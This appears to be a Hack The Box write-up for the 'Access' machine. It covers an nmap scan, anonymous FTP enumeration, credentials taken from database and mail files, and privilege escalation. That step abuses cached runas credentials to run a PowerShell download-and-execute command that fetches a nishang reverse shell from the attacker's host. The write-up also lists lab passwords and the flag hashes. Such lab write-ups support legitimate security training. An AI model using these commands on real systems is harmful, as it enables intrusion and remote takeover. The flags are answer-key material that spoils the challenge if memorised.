+++
title = "HTB - Access"
date = 2024-11-11
+++

### Scan
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 16:25 EST
Nmap scan report for 10.10.10.98
Host is up (0.13s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.57 seconds
```

### Enumeration
##### FTP
Anonymous login is allowed, and we find two directories with files. Had to use `bin` before `get` to download the database
`zip` chokes. Use `7z`: `7z x file.zip`. Need a password.
Linux cannot open the `mdb` file, but we can head to https://www.mdbopener.com/ to view files. DO NOT DO IRL.
We find an authorized user table with credentials:
`admin:admin` `engineer:access4u@security` `backup_admin:admin`
We can use the credentials to spray against our `zip` file.
Once done, we get a `pst` file and can open online here https://goldfynch.com/pst-viewer. DO NOT DO IRL.
We get an updated password for a `security` account. `4Cc3ssC0ntr0ller`
We can authenticate to `telnet` with these and find our flag.
User:`9e8b1296656272ddf0995593a10e918c`

### Privilege Escalation
Nothing in the security desktop, but if we check out the `Public` desktop, we find a security system `lnk` file
Take a look: `type "ZKAccess3.5 Security System".lnk`
These are plain-text and readable, and we find `runas` caching Administrator credentials.
We can validate this by checking what credentials are stored with: `cmdkey /list`
Then, abusing the `runas` instance, we can set ourselves up for a `nishang` shell. Copy to working directory from the `/opt/nishang` directory.
Serve with python instance and start a listener.
Execute on `runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10:8000/Invoke-PowerShellTcp.ps1')"`
We should get a call back ;)
Root:`2150f04f932ed22ada561f8fe02265a9`


